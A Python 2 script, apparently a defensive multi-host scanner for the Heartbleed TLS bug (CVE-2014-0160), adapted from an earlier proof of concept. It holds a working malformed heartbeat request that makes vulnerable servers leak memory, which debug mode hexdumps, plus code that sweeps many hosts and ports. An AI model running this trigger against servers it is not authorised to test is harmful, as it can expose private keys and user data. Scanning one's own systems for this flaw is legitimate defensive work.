#!/usr/bin/env python
#
# Multi-threaded, multi-host vulnerability scanner for CVE-2014-0160 :heartbleed bug
#
# Author: Sorin Sbarnea @ citrix . com
#
# Based on an original version made by by Jared Stafford (jspenguin@jspenguin.org)

import os
import sys
import struct
import socket
import time
import select
import re
import logging
from optparse import OptionParser
import multiprocessing
from multiprocessing import Process, Manager, Pool


options = OptionParser(usage='%prog server [options]', description='Test for SSL heartbeat vulnerability (CVE-2014-0160)')
options.add_option('-p', '--port', type='int', default=443, help='TCP port to test (default: 443)')
options.add_option('-s', '--starttls', action='store_true', default=False, help='Check STARTTLS')
options.add_option('-d', '--debug', action='store_true', default=False, help='Enable debug output')

DEBUG = 0
#logging.basicConfig(level=logging.DEBUG)

def check_port(address, port):
	# Create a TCP socket
	s = socket.socket()
	logging.debug("Attempting to connect to %s on port %s" % (address, port))
	try:
		s.connect((address, port))
		logging.debug("Connected to %s on port %s" % (address, port))
		return True
	except socket.error, e:
		logging.debug("Connection to %s on port %s failed: %s" % (address, port, e))
		return False

def h2bin(x):
    return x.replace(' ', '').replace('\n', '').decode('hex')

hello = h2bin('''
16 03 02 00  dc 01 00 00 d8 03 02 53
43 5b 90 9d 9b 72 0b bc  0c bc 2b 92 a8 48 97 cf
bd 39 04 cc 16 0a 85 03  90 9f 77 04 33 d4 de 00
00 66 c0 14 c0 0a c0 22  c0 21 00 39 00 38 00 88
00 87 c0 0f c0 05 00 35  00 84 c0 12 c0 08 c0 1c
c0 1b 00 16 00 13 c0 0d  c0 03 00 0a c0 13 c0 09
c0 1f c0 1e 00 33 00 32  00 9a 00 99 00 45 00 44
c0 0e c0 04 00 2f 00 96  00 41 c0 11 c0 07 c0 0c
c0 02 00 05 00 04 00 15  00 12 00 09 00 14 00 11
00 08 00 06 00 03 00 ff  01 00 00 49 00 0b 00 04
03 00 01 02 00 0a 00 34  00 32 00 0e 00 0d 00 19
00 0b 00 0c 00 18 00 09  00 0a 00 16 00 17 00 08
00 06 00 07 00 14 00 15  00 04 00 05 00 12 00 13
00 01 00 02 00 03 00 0f  00 10 00 11 00 23 00 00
00 0f 00 01 01                                  
''')

hb = h2bin(''' 
18 03 02 00 03
01 40 00
''')

def hexdump(s):
    ret = ""
    for b in xrange(0, len(s), 16):
        lin = [c for c in s[b : b + 16]]
        hxdat = ' '.join('%02X' % ord(c) for c in lin)
        pdat = ''.join((c if 32 <= ord(c) <= 126 else '.' )for c in lin)
        ret += '  %04x: %-48s %s\n' % (b, hxdat, pdat)
    return ret

def recvall(s, length, timeout=5):
    endtime = time.time() + timeout
    rdata = ''
    remain = length
    while remain > 0:
        rtime = endtime - time.time() 
        if rtime < 0:
            return None
        r, w, e = select.select([s], [], [], 5)
        if s in r:
            data = s.recv(remain)
            # EOF?
            if not data:
                return None
            rdata += data
            remain -= len(data)
    return rdata
        

def recvmsg(s):
    hdr = recvall(s, 5)
    if hdr is None:
        logging.debug('Unexpected EOF receiving record header - server closed connection')
        return None, None, None
    typ, ver, ln = struct.unpack('>BHH', hdr)
    pay = recvall(s, ln, 10)
    if pay is None:
        logging.debug('Unexpected EOF receiving record payload - server closed connection')
        return None, None, None
    logging.debug(' ... received message: type = %d, ver = %04x, length = %d' % (typ, ver, len(pay)))
    return typ, ver, pay

def hit_hb(s):
    """
    True = vulnerable
    """
    s.send(hb)
    while True:
        typ, ver, pay = recvmsg(s)
        if typ is None:
            logging.debug('No heartbeat response received, server likely not vulnerable')
            return False

        if typ == 24:
            logging.debug('Received heartbeat response:')
            logging.debug(hexdump(pay))
            if len(pay) > 3:
                logging.warn('WARNING: server returned more data than it should - server is vulnerable!')
            else:
                logging.debug('Server processed malformed heartbeat, but did not return any extra data.')
            return True

        if typ == 21:
            logging.debug('Received alert:')
            logging.debug(hexdump(pay))
            logging.debug('Server returned error, likely not vulnerable')
            return False

def main(host, port=443, debug=False, starttls=False):
    """

    False : is not vulnerable
    True : is vulnerable
    2 : failed to validate
    3 : START TLS failed

    """
    """
    """
    """
    opts, args = options.parse_args()
    if len(args) < 1:
        options.print_help()
        return
    """

    if port in [22,25,143,587,110]:
        starttls = True

   #  587, 993, 465, 21, 22


    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    logging.debug('Connecting... %s:%s' % (host, port))
    sys.stdout.flush()
    try:
        s.connect((host, port))
    except Exception, e:
        logging.error("Exception: %s" % e)
        return 2

    if starttls:
        res = s.recv(4096)
        if debug: logging.debug(res)
        s.send('ehlo starttlstest\n')
        res = s.recv(1024)
        if debug: logging.debug(res)
        if not 'STARTTLS' in res:
            if debug: logging.debug(res)
            logging.error('STARTTLS not supported...')
            return 3
        s.send('starttls\n')
        res = s.recv(1024)
    
    logging.debug('Sending Client Hello...')
    sys.stdout.flush()
    s.send(hello)
    logging.debug('Waiting for Server Hello...')
    sys.stdout.flush()
    while True:
        typ, ver, pay = recvmsg(s)
        if typ is None:
            logging.debug('Server closed connection without sending Server Hello.')
            return 2
        # Look for server hello done message.
        if typ == 22 and ord(pay[0]) == 0x0E:
            break

    logging.debug('Sending heartbeat request...')
    sys.stdout.flush()
    s.send(hb)
    try:
        ret = hit_hb(s)
    except Exception, e:
        if e.errno == 54:
            # We do assume that Connection reset by peer is acceptable.
            return False
        logging.error("%s:%s %s" % (host, port, e))

    logging.debug("Returning %s for %s:%s" % (ret, host, port))

    return ret

manager = Manager()
vulnerables = manager.dict()


def f(x):
    try:
        host, port, zz = x
        if check_port(host, port):
            ret = main(host)
            #if ret is True :  # 2 means skipped due to internal error
            vulnerables[(host,port)]=ret
    except Exception, e:
        vulnerables[(host,port)]=e

if __name__ == '__main__':

    start = time.time()

    hosts = {}
    errors = 0


    if os.path.isfile("hosts"):
        _hosts = open("hosts","r").readlines()
    elif os.environ['HOSTS']:
        _hosts = os.environ['HOSTS'].split()
    for host in _hosts:
        host = host.strip()
        if host and host[0] != "#":
            try:
                ip = socket.gethostbyname(host)
                if ip not in hosts:
                    hosts[ip]=[host]
                elif host not in hosts[ip]:
                    hosts[ip].append(host)
            except Exception, e:
                logging.error("Failed to resolve: %s" % host)

    print("List of hosts[%s]: %s" % (len(hosts), sorted(hosts)))

    #ports = [ 443, 25, 587, 143, 993, 465, 21, 22, 110]
    ports = [ 443, 25, 22, 587, 143, 110]
    #ports = [ 443 ]

    to_check = []

    threads = multiprocessing.cpu_count()*4

    if DEBUG:
        threads = 1

    logging.warning("Running on %s threads and having to scan %s hosts and %s ports" % (threads, len(hosts), len(ports)))

    pool = Pool(processes=threads)
    for host in hosts:
        for port in ports:
            service = "%s:%s" % (host, port)
            to_check.append((host, port, vulnerables))

    rs = pool.map_async(f, to_check)
    while not rs.ready():
        print("%s jobs left..." % rs._number_left)
        time.sleep(3)

    if vulnerables:
        listing = ""
        for host, port in sorted(vulnerables.keys()):
            listing += "\t%s:%s (%s) => %s\n" % (host, port, vulnerables[(host,port)], ", ".join(sorted(hosts[host])))

        logging.error("Found %s/%s (%.0f%%) vulnerable services:\n%s" % \
                      (len(vulnerables), len(to_check), len(vulnerables)*100/len(to_check), listing))


    end = time.time()

    print("-- done in %.0fs seconds --" % (end - start))
    if vulnerables:
        sys.exit(1)